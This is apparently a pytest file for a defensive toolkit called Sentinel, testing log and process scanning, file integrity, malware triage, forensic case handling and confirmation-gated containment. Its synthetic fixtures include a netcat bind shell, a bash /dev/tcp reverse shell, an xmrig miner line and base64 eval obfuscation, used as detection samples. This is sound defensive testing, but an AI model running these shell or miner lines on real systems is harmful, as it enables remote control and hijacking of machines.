"""Hermetic tests for the Sentinel defensive tooling.

All fixtures are synthetic; nothing touches the network, the host's
real auth logs, or any process table. Containment tests never execute
anything — they verify the dry-run gate refuses without confirmation.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from levi.sentinel import contain, forensics, integrity, triage, watch


# ---------------------------------------------------------------- watch ---

AUTH_LOG_SYNTHETIC = """\
Jan  1 10:00:01 host sshd[1]: Failed password for root from 10.0.0.9 port 1
Jan  1 10:00:02 host sshd[2]: Failed password for root from 10.0.0.9 port 2
Jan  1 10:00:03 host sshd[3]: Failed password for admin from 10.0.0.9 port 3
Jan  1 10:00:04 host sshd[4]: Invalid user hacker from 10.0.0.9 port 4
Jan  1 10:00:05 host sshd[5]: Accepted password for legit from 10.0.0.1 port 5
"""

PS_SYNTHETIC = """\
root       1  0.0  0.1  init
eve     4242  0.0  0.0  nc -l -p 4444 -e /bin/bash
mallory 4243  0.0  0.0  /usr/bin/python3 server.py
"""

PS_CLEAN = """\
root       1  0.0  0.1  init
daemon   100  0.0  0.0  /usr/sbin/cron -f
"""


def test_scan_failed_logins_alerts_over_threshold(tmp_path):
    log = tmp_path / "auth.log"
    # 25 failed attempts > threshold 20
    log.write_text(
        "".join(
            f"Jan 1 10:00:{i:02d} host sshd[{i}]: Failed password for root from 10.9.9.9 port {i}\n"
            for i in range(25)
        ),
        encoding="utf-8",
    )
    result = watch.scan_failed_logins(str(log))
    assert not result.ok
    assert len(result.alerts) == 1
    assert result.detail["failed_attempts"] == 25
    assert len(result.detail["recent"]) <= 5


def test_scan_failed_logins_quiet_below_threshold(tmp_path):
    log = tmp_path / "auth.log"
    log.write_text(AUTH_LOG_SYNTHETIC, encoding="utf-8")
    result = watch.scan_failed_logins(str(log))
    assert result.ok
    assert result.alerts == []
    assert result.detail["failed_attempts"] == 4


def test_scan_failed_logins_missing_log():
    result = watch.scan_failed_logins("/nonexistent-levi-test/auth.log")
    assert result.ok  # missing log is informational, not an alert


def test_scan_processes_flags_markers():
    result = watch.scan_processes(PS_SYNTHETIC)
    assert not result.ok
    assert result.detail["suspicious"] == 1
    assert any("nc -l" in marker for marker in result.detail["markers"])


def test_scan_processes_clean():
    result = watch.scan_processes(PS_CLEAN)
    assert result.ok
    assert result.alerts == []


def test_run_watch_structure(tmp_path):
    log = tmp_path / "auth.log"
    log.write_text(AUTH_LOG_SYNTHETIC, encoding="utf-8")
    report = watch.run_watch(str(log))
    assert report["alert_count"] == 0
    assert {s["sensor"] for s in report["sensors"]} == {
        "failed_logins",
        "suspicious_processes",
        "listening_ports",
    }


# ------------------------------------------------------------- integrity ---


def _seed_tree(root: Path) -> None:
    (root / "etc").mkdir(parents=True)
    (root / "etc" / "a.conf").write_text("alpha\n", encoding="utf-8")
    (root / "etc" / "b.conf").write_text("beta\n", encoding="utf-8")


def test_integrity_round_trip_clean(tmp_path):
    root = tmp_path / "host"
    _seed_tree(root)
    manifest = tmp_path / "base.json"
    summary = integrity.create_baseline(str(root), str(manifest))
    assert summary["files"] == 2
    assert json.loads(manifest.read_text())["version"] == integrity.MANIFEST_VERSION
    diff = integrity.verify_baseline(str(root), str(manifest))
    assert diff.clean


def test_integrity_detects_changes(tmp_path):
    root = tmp_path / "host"
    _seed_tree(root)
    manifest = tmp_path / "base.json"
    integrity.create_baseline(str(root), str(manifest))
    (root / "etc" / "a.conf").write_text("alpha-MODIFIED\n", encoding="utf-8")
    (root / "etc" / "c.conf").write_text("new\n", encoding="utf-8")
    (root / "etc" / "b.conf").unlink()
    diff = integrity.verify_baseline(str(root), str(manifest))
    assert not diff.clean
    assert diff.changed == ["etc/a.conf"]
    assert diff.added == ["etc/c.conf"]
    assert diff.removed == ["etc/b.conf"]


def test_integrity_rejects_bad_root(tmp_path):
    with pytest.raises(ValueError):
        integrity.create_baseline(str(tmp_path / "nope"), str(tmp_path / "m.json"))


# ---------------------------------------------------------------- triage ---


def test_triage_flags_reverse_shell(tmp_path):
    evil = tmp_path / "payload.sh"
    evil.write_bytes(b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.9/4444 0>&1\n")
    good = tmp_path / "notes.txt"
    good.write_text("grocery list\n", encoding="utf-8")
    report = triage.triage_scan(str(tmp_path))
    assert report.scanned == 2
    assert len(report.findings) == 1
    finding = report.findings[0]
    assert finding.rule_id == "reverse-shell"
    assert finding.severity == "high"
    assert len(finding.sha256) == 64


def test_triage_flags_miner_and_obfuscation(tmp_path):
    (tmp_path / "m.sh").write_bytes(b"exec xmrig --url stratum+tcp://x\n")
    (tmp_path / "o.py").write_bytes(b"eval(base64.b64decode('e30='))\n")
    report = triage.triage_scan(str(tmp_path))
    assert {f.rule_id for f in report.findings} == {"miner", "obfuscation"}


def test_triage_clean_tree(tmp_path):
    (tmp_path / "readme.md").write_text("# hello\n", encoding="utf-8")
    report = triage.triage_scan(str(tmp_path))
    assert report.findings == []
    assert report.errors == []


def test_triage_rejects_bad_root(tmp_path):
    with pytest.raises(ValueError):
        triage.triage_scan(str(tmp_path / "nope"))


# -------------------------------------------------------------- forensics ---


def test_case_lifecycle(tmp_path):
    case = forensics.create_case("synthetic incident", root=tmp_path)
    assert (case.path / "evidence").is_dir()
    assert (case.path / "logs").is_dir()
    case.log("seized usb image", {"hash": "abc123"})
    events = case.custody_events()
    assert len(events) == 2  # created + logged
    assert events[1]["event"] == "seized usb image"
    target = tmp_path / "evidence.bin"
    target.write_bytes(b"\x00\x01synthetic")
    hashes = case.hash_path(str(target))
    assert len(hashes) == 1
    summary = case.write_summary()
    text = summary.read_text(encoding="utf-8")
    assert "synthetic_incident" in text or "Case" in text


def test_case_name_sanitized(tmp_path):
    case = forensics.create_case("  Weird Name!!/../ ", root=tmp_path)
    assert ".." not in case.path.name
    assert case.name.replace("_", "").replace("-", "").isalnum()


def test_open_case_round_trip(tmp_path):
    case = forensics.create_case("reopen me", root=tmp_path)
    reopened = forensics.open_case(str(case.path))
    assert reopened.path == case.path


# --------------------------------------------------------------- contain ---


def test_plan_block_ip_valid():
    plan = contain.plan_block_ip("203.0.113.9")
    assert plan.action == "block_ip"
    assert plan.target == "203.0.113.9"
    assert plan.commands == [
        ["iptables", "-A", "INPUT", "-s", "203.0.113.9", "-j", "DROP"]
    ]
    preview = plan.preview()
    assert "203.0.113.9" in preview
    assert "Nothing has executed" in preview


def test_plan_block_ip_rejects_bad_input():
    for bad in ("not-an-ip", "999.1.1.1", "127.0.0.1", "", "10.0.0.1/24"):
        with pytest.raises(ValueError):
            contain.plan_block_ip(bad)


def test_plan_terminate_rejects_pid1():
    with pytest.raises(ValueError):
        contain.plan_terminate_process(1)
    plan = contain.plan_terminate_process(4242)
    assert plan.commands == [["kill", "-TERM", "4242"]]
    assert not plan.reversible


def test_apply_plan_requires_confirmation():
    plan = contain.plan_block_ip("203.0.113.9")
    with pytest.raises(PermissionError):
        contain.apply_plan(plan, confirm=False)
    with pytest.raises(PermissionError):
        contain.apply_plan(plan)  # default is dry run


def test_apply_plan_executes_only_with_confirm(monkeypatch):
    plan = contain.plan_block_ip("203.0.113.9")

    class FakeProc:
        returncode = 0
        stderr = ""

    calls = []

    def fake_run(cmd, **kwargs):
        calls.append(cmd)
        return FakeProc()

    monkeypatch.setattr(contain.subprocess, "run", fake_run)
    receipt = contain.apply_plan(plan, confirm=True)
    assert calls == [["iptables", "-A", "INPUT", "-s", "203.0.113.9", "-j", "DROP"]]
    assert receipt["verified"] is True
    assert receipt["action"] == "block_ip"


def test_is_valid_ipv4():
    assert contain.is_valid_ipv4("192.168.1.1")
    assert not contain.is_valid_ipv4("256.0.0.1")
    assert not contain.is_valid_ipv4("::1")
